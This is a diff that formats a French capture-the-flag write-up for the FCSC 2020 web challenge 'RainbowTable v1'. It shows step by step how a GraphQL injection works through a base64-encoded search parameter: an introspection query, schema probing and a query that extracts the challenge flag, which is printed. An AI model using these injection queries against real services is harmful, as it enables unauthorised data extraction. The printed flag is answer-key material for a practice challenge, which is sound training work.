@@ -1,6 +1,30 @@
-Analyse --
+<p align="center">
+  <a href="" rel="noopener">
+ <img style="width:50px;" src="https://france-cybersecurity-challenge.fr/files/abecee1bc8e9f22344226e697e672a7d/navbar_logo.png" alt="Project logo"></a>
+</p>
+<h1 align="center">RainbowTable v1</h1>
 
+<div align="center">
 
+[![CTF](https://img.shields.io/badge/FCSC-2020-red.svg)](https://france-cybersecurity-challenge.fr/)
+[![CTF](https://img.shields.io/badge/Catégorie-Web-yellow.svg)](#)
+
+</div>
+
+---
+
+## 📝 Table des matières
+
+- [Enoncé](#problem_statement)
+- [Sources](#idea)
+
+## 🧐 Enoncé <a name = "problem_statement"></a>
+
+Nous avons développé une plateforme de recherche de cuisiniers. Venez la tester !
+
+URL : http://challenges2.france-cybersecurity-challenge.fr:5006/
+
+```html
 <html>
 <head>
 	<title>Rainbow Pages</title>
@@ -111,29 +135,29 @@ Analyse --
 	</script>
 </body>
 </html>
-
-
+```
 
 La fonction makeSearch envoie une requete GET avec la valeur d'une requete en base64 ??
-
-Direction challenges2.france-cybersecurity-challenge.fr:5006?search=test
-
+```
+?search=test
+```
 L'erreur : 
-
+```json
 {"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"\\uFFFD\".","locations":[{"line":1,"column":1}]}]}
-
+```
 Cette erreur correspond à un serveur GRAPHQL
-
 
 Injection GRAPHQL ?
 
 Format de la requete de base : 
-
+```json
 { allCooks (filter: { firstname: {like: "%'+searchInput+'%"}}) { nodes { firstname, lastname, speciality, price }}}
+```
 
+J'ai trouvé un petit script graphql pour afficher la totalité des tables sur un dépot github. (Disponible dans les sources)
 
 Pour commencer il faut analyser la base de donnée:
-
+```json
 fragment FullType on __Type {
   kind
   name
@@ -228,42 +252,51 @@ query IntrospectionQuery {
     }
   }
 }
-
+```
 Convertir cette valeur en base64
-
+```
 ZnJhZ21lbnQgRnVsbFR5cGUgb24gX19UeXBlIHsKICBraW5kCiAgbmFtZQogIGRlc2NyaXB0aW9uCiAgZmllbGRzKGluY2x1ZGVEZXByZWNhdGVkOiB0cnVlKSB7CiAgICBuYW1lCiAgICBkZXNjcmlwdGlvbgogICAgYXJncyB7CiAgICAgIC4uLklucHV0VmFsdWUKICAgIH0KICAgIHR5cGUgewogICAgICAuLi5UeXBlUmVmCiAgICB9CiAgICBpc0RlcHJlY2F0ZWQKICAgIGRlcHJlY2F0aW9uUmVhc29uCiAgfQogIGlucHV0RmllbGRzIHsKICAgIC4uLklucHV0VmFsdWUKICB9CiAgaW50ZXJmYWNlcyB7CiAgICAuLi5UeXBlUmVmCiAgfQogIGVudW1WYWx1ZXMoaW5jbHVkZURlcHJlY2F0ZWQ6IHRydWUpIHsKICAgIG5hbWUKICAgIGRlc2NyaXB0aW9uCiAgICBpc0RlcHJlY2F0ZWQKICAgIGRlcHJlY2F0aW9uUmVhc29uCiAgfQogIHBvc3NpYmxlVHlwZXMgewogICAgLi4uVHlwZVJlZgogIH0KfQpmcmFnbWVudCBJbnB1dFZhbHVlIG9uIF9fSW5wdXRWYWx1ZSB7CiAgbmFtZQogIGRlc2NyaXB0aW9uCiAgdHlwZSB7CiAgICAuLi5UeXBlUmVmCiAgfQogIGRlZmF1bHRWYWx1ZQp9CmZyYWdtZW50IFR5cGVSZWYgb24gX19UeXBlIHsKICBraW5kCiAgbmFtZQogIG9mVHlwZSB7CiAgICBraW5kCiAgICBuYW1lCiAgICBvZlR5cGUgewogICAgICBraW5kCiAgICAgIG5hbWUKICAgICAgb2ZUeXBlIHsKICAgICAgICBraW5kCiAgICAgICAgbmFtZQogICAgICAgIG9mVHlwZSB7CiAgICAgICAgICBraW5kCiAgICAgICAgICBuYW1lCiAgICAgICAgICBvZlR5cGUgewogICAgICAgICAgICBraW5kCiAgICAgICAgICAgIG5hbWUKICAgICAgICAgICAgb2ZUeXBlIHsKICAgICAgICAgICAgICBraW5kCiAgICAgICAgICAgICAgbmFtZQogICAgICAgICAgICAgIG9mVHlwZSB7CiAgICAgICAgICAgICAgICBraW5kCiAgICAgICAgICAgICAgICBuYW1lCiAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICB9CiAgfQp9CgpxdWVyeSBJbnRyb3NwZWN0aW9uUXVlcnkgewogIF9fc2NoZW1hIHsKICAgIHF1ZXJ5VHlwZSB7CiAgICAgIG5hbWUKICAgIH0KICAgIG11dGF0aW9uVHlwZSB7CiAgICAgIG5hbWUKICAgIH0KICAgIHR5cGVzIHsKICAgICAgLi4uRnVsbFR5cGUKICAgIH0KICAgIGRpcmVjdGl2ZXMgewogICAgICBuYW1lCiAgICAgIGRlc2NyaXB0aW9uCiAgICAgIGxvY2F0aW9ucwogICAgICBhcmdzIHsKICAgICAgICAuLi5JbnB1dFZhbHVlCiAgICAgIH0KICAgIH0KICB9Cn0=
-
+```
 
 Mettre la valeur en base64 dans search=
 
 -- Un json est retourné voir, allTables.json
-
+```
 CTRL + F : Flag
-
+```
+```
 allFlags et Flag
-
+```
+```
 allFlag
+```
 
-Analysons Flag 
-
-Req : (Convertir en base64)
+Convertir la requete en base64
+```
 {__type (name: "Flag") {name fields{name type{name kind ofType{name kind}}}}}
-
-Retour : 
+```
+Retour :
+``` 
 {"data":{"__type":{"name":"Flag","fields":[{"name":"nodeId","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"ID","kind":"SCALAR"}}},{"name":"id","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"Int","kind":"SCALAR"}}},{"name":"flag","type":{"name":"String","kind":"SCALAR","ofType":null}}]}}}
-
+```
 On y trouve id et flag
 
 Maintenant récuperer la requete de base :
-
+```
 { allCooks (filter: { firstname: {like: "%'+searchInput+'%"}}) { nodes { firstname, lastname, speciality, price }}}
-
+```
 Modifier en fonction du résultat
-
+```
 { AllFlags { nodes { flag }}}
-
+```
 
 Resultat : 
-
+```
 {"data":{"allFlags":{"nodes":[{"flag":"FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}"}]}}}
+```
 
+## ⛓️ Sources <a name = "limitations"></a>
+
+Graphql : https://graphql.org/
+
+Git - swisskyrepo : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
